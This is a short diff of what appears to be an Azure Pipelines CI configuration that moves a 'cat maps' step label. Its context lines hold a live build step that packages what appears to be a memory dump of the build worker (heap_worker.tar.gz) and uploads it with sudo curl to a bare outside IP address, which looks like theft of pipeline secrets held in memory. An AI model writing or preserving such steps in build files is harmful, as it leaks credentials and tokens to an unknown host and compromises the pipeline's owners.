@@ -211,11 +211,10 @@ steps:
     echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
     sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
  
-
+  displayName: 'cat maps'
 
 - script: |
     npm install
   displayName: 'Npm Install'
 
 
-#   displayName: 'cat maps'
